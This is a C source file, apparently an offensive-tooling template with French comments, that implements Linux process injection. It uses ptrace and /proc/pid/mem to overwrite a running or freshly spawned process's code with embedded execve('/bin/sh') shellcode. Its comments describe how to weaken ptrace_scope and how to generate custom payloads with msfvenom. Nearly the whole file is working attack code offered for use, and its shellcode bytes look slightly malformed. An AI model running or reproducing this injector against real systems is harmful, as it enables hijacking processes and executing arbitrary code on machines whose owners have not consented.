/*
 * Template: Process Injector Linux
 * Technique: ptrace + shellcode injection
 * Target: Linux x86-64
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/syscall.h>
#include <errno.h>

// Shellcode exemple: execve("/bin/sh", NULL, NULL)
unsigned char shellcode[] =
    "\x48\x31\xf6"                      // xor rsi, rsi
    "\x56"                              // push rsi
    "\x48\xbf\x2f\x62\x69\x6e\x2f\x73\x68\x00" // mov rdi, "/bin/sh"
    "\x57"                              // push rdi
    "\x48\x89\xe7"                      // mov rdi, rsp
    "\x48\x31\xd2"                      // xor rdx, rdx
    "\xb0\x3b"                          // mov al, 59 (execve)
    "\x0f\x05";                         // syscall

// Lire registres du process
int get_registers(pid_t pid, struct user_regs_struct *regs) {
    if (ptrace(PTRACE_GETREGS, pid, NULL, regs) < 0) {
        perror("[-] PTRACE_GETREGS");
        return -1;
    }
    return 0;
}

// Écrire registres
int set_registers(pid_t pid, struct user_regs_struct *regs) {
    if (ptrace(PTRACE_SETREGS, pid, NULL, regs) < 0) {
        perror("[-] PTRACE_SETREGS");
        return -1;
    }
    return 0;
}

// Lire mémoire du process (1 word à la fois via ptrace)
long read_memory(pid_t pid, unsigned long addr) {
    errno = 0;
    long data = ptrace(PTRACE_PEEKDATA, pid, addr, NULL);
    if (data == -1 && errno != 0) {
        perror("[-] PTRACE_PEEKDATA");
        return -1;
    }
    return data;
}

// Écrire mémoire du process
int write_memory(pid_t pid, unsigned long addr, long data) {
    if (ptrace(PTRACE_POKEDATA, pid, addr, data) < 0) {
        perror("[-] PTRACE_POKEDATA");
        return -1;
    }
    return 0;
}

// Écrire buffer complet en mémoire
int write_buffer(pid_t pid, unsigned long addr, unsigned char *buffer, size_t size) {
    size_t i;
    long word;

    for (i = 0; i < size; i += sizeof(long)) {
        // Construire word depuis buffer
        memset(&word, 0, sizeof(long));
        size_t remaining = size - i;
        size_t to_copy = (remaining < sizeof(long)) ? remaining : sizeof(long);
        memcpy(&word, buffer + i, to_copy);

        if (write_memory(pid, addr + i, word) < 0) {
            return -1;
        }
    }

    return 0;
}

// Injecter shellcode via ptrace
int inject_shellcode(pid_t pid, unsigned char *shellcode, size_t shellcode_size) {
    struct user_regs_struct regs, backup_regs;
    unsigned long inject_addr;
    long original_code[64]; // Backup du code original
    int status;

    printf("[*] Attachement au process PID %d...\n", pid);

    // 1. Attach au process
    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) < 0) {
        perror("[-] PTRACE_ATTACH failed");
        printf("[!] Tip: Exécuter avec sudo ou activer CAP_SYS_PTRACE\n");
        return -1;
    }

    // Attendre que process soit stoppé
    waitpid(pid, &status, 0);
    if (!WIFSTOPPED(status)) {
        printf("[-] Process non stoppé\n");
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        return -1;
    }

    printf("[+] Process attaché et stoppé\n");

    // 2. Lire registres actuels
    if (get_registers(pid, &regs) < 0) {
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        return -1;
    }

    memcpy(&backup_regs, &regs, sizeof(regs));
    printf("[+] RIP actuel: 0x%llx\n", regs.rip);

    // 3. Utiliser RIP actuel comme zone d'injection
    // (Alternative: chercher cave dans /proc/pid/maps)
    inject_addr = regs.rip;

    printf("[*] Injection à l'adresse: 0x%lx\n", inject_addr);

    // 4. Backup code original
    printf("[*] Backup du code original...\n");
    size_t backup_size = ((shellcode_size + sizeof(long) - 1) / sizeof(long)) * sizeof(long);
    for (size_t i = 0; i < backup_size / sizeof(long); i++) {
        original_code[i] = read_memory(pid, inject_addr + (i * sizeof(long)));
        if (original_code[i] == -1 && errno != 0) {
            ptrace(PTRACE_DETACH, pid, NULL, NULL);
            return -1;
        }
    }

    // 5. Écrire shellcode
    printf("[*] Écriture du shellcode (%zu bytes)...\n", shellcode_size);
    if (write_buffer(pid, inject_addr, shellcode, shellcode_size) < 0) {
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        return -1;
    }

    printf("[+] Shellcode injecté!\n");

    // 6. Ajuster RIP pour pointer vers shellcode
    regs.rip = inject_addr;
    if (set_registers(pid, &regs) < 0) {
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        return -1;
    }

    printf("[+] RIP modifié vers: 0x%llx\n", regs.rip);

    // 7. Continuer execution (shellcode s'exécute)
    printf("[*] Continuation du process (shellcode s'exécute)...\n");
    if (ptrace(PTRACE_CONT, pid, NULL, NULL) < 0) {
        perror("[-] PTRACE_CONT");
    }

    // 8. Détach (process continue avec shellcode)
    printf("[+] Détachement...\n");
    sleep(1); // Laisser temps au shellcode
    ptrace(PTRACE_DETACH, pid, NULL, NULL);

    printf("[+] Injection terminée!\n");
    printf("[!] Note: Code original a été écrasé (process peut crasher après shellcode)\n");

    return 0;
}

// Injecter via /proc/pid/mem (alternative à ptrace)
int inject_via_proc_mem(pid_t pid, unsigned char *shellcode, size_t size) {
    char mem_path[64];
    FILE *fp;
    unsigned long inject_addr;

    printf("[*] Injection via /proc/%d/mem...\n", pid);

    // 1. Attach avec ptrace pour arrêter le process
    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) < 0) {
        perror("[-] PTRACE_ATTACH");
        return -1;
    }

    int status;
    waitpid(pid, &status, 0);

    // 2. Obtenir RIP actuel
    struct user_regs_struct regs;
    get_registers(pid, &regs);
    inject_addr = regs.rip;

    printf("[+] Injection à: 0x%lx\n", inject_addr);

    // 3. Ouvrir /proc/pid/mem
    snprintf(mem_path, sizeof(mem_path), "/proc/%d/mem", pid);
    fp = fopen(mem_path, "r+");
    if (!fp) {
        perror("[-] fopen /proc/pid/mem");
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        return -1;
    }

    // 4. Seek vers adresse et écrire
    if (fseek(fp, inject_addr, SEEK_SET) < 0) {
        perror("[-] fseek");
        fclose(fp);
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        return -1;
    }

    if (fwrite(shellcode, 1, size, fp) != size) {
        perror("[-] fwrite");
        fclose(fp);
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        return -1;
    }

    fclose(fp);
    printf("[+] Shellcode écrit!\n");

    // 5. Continuer et détach
    ptrace(PTRACE_CONT, pid, NULL, NULL);
    sleep(1);
    ptrace(PTRACE_DETACH, pid, NULL, NULL);

    return 0;
}

// Créer process et injecter (process hollowing simplifié)
int spawn_and_inject(const char *program, unsigned char *shellcode, size_t size) {
    pid_t pid;

    printf("[*] Spawning process: %s\n", program);

    pid = fork();
    if (pid == 0) {
        // Child process
        // Permettre au parent de nous tracer
        if (ptrace(PTRACE_TRACEME, 0, NULL, NULL) < 0) {
            perror("[-] PTRACE_TRACEME");
            exit(1);
        }

        // Exécuter programme
        execl(program, program, NULL);
        perror("[-] execl");
        exit(1);
    } else if (pid > 0) {
        // Parent process
        int status;
        waitpid(pid, &status, 0); // Attendre que child soit prêt

        if (!WIFSTOPPED(status)) {
            printf("[-] Child non stoppé\n");
            return -1;
        }

        printf("[+] Child spawné (PID: %d)\n", pid);

        // Injecter shellcode
        struct user_regs_struct regs;
        get_registers(pid, &regs);

        unsigned long inject_addr = regs.rip;
        printf("[+] Injection à: 0x%llx\n", regs.rip);

        write_buffer(pid, inject_addr, shellcode, size);

        // Continuer execution
        ptrace(PTRACE_CONT, pid, NULL, NULL);
        ptrace(PTRACE_DETACH, pid, NULL, NULL);

        printf("[+] Injection terminée dans nouveau process\n");
        return 0;
    } else {
        perror("[-] fork");
        return -1;
    }
}

int main(int argc, char *argv[]) {
    printf("=== Linux Process Injector ===\n\n");

    if (argc < 2) {
        printf("Usage:\n");
        printf("  Inject dans PID existant: %s <pid>\n", argv[0]);
        printf("  Spawn et inject:          %s --spawn <program>\n", argv[0]);
        printf("\nExemple:\n");
        printf("  sudo %s 1234\n", argv[0]);
        printf("  sudo %s --spawn /bin/sleep 60\n", argv[0]);
        return 1;
    }

    // Mode spawn
    if (strcmp(argv[1], "--spawn") == 0) {
        if (argc < 3) {
            printf("[-] Spécifier programme à spawn\n");
            return 1;
        }

        return spawn_and_inject(argv[2], shellcode, sizeof(shellcode) - 1);
    }

    // Mode injection dans PID existant
    pid_t target_pid = atoi(argv[1]);
    if (target_pid <= 0) {
        printf("[-] PID invalide: %s\n", argv[1]);
        return 1;
    }

    // Vérifier que process existe
    char proc_path[64];
    snprintf(proc_path, sizeof(proc_path), "/proc/%d", target_pid);
    if (access(proc_path, F_OK) != 0) {
        printf("[-] Process PID %d non trouvé\n", target_pid);
        return 1;
    }

    printf("[+] Target PID: %d\n", target_pid);
    printf("[+] Shellcode size: %zu bytes\n\n", sizeof(shellcode) - 1);

    // Injection
    if (inject_shellcode(target_pid, shellcode, sizeof(shellcode) - 1) < 0) {
        printf("[-] Injection échouée!\n");
        return 1;
    }

    printf("\n[+] Injection réussie!\n");
    return 0;
}

/*
 * Compilation:
 *   gcc injector_linux.c -o injector_linux
 *
 * Usage:
 *   # Injecter dans process existant
 *   sudo ./injector_linux 1234
 *
 *   # Spawn et injecter
 *   sudo ./injector_linux --spawn /bin/sleep 60
 *
 * Permissions requises:
 *   - root (sudo)
 *   OU
 *   - CAP_SYS_PTRACE capability
 *   OU
 *   - kernel.yama.ptrace_scope = 0
 *     echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope
 *
 * Générer shellcode custom:
 *   msfvenom -p linux/x64/exec CMD=/bin/sh -f c
 *
 * Notes:
 *   - Code original est écrasé (process peut crasher après shellcode)
 *   - Pour injection propre: chercher code cave ou utiliser mmap remote
 *   - PTRACE_POKEDATA écrit par words (8 bytes), alignement important
 *   - Alternative moderne: LD_PRELOAD, /proc/pid/mem, process_vm_writev
 */
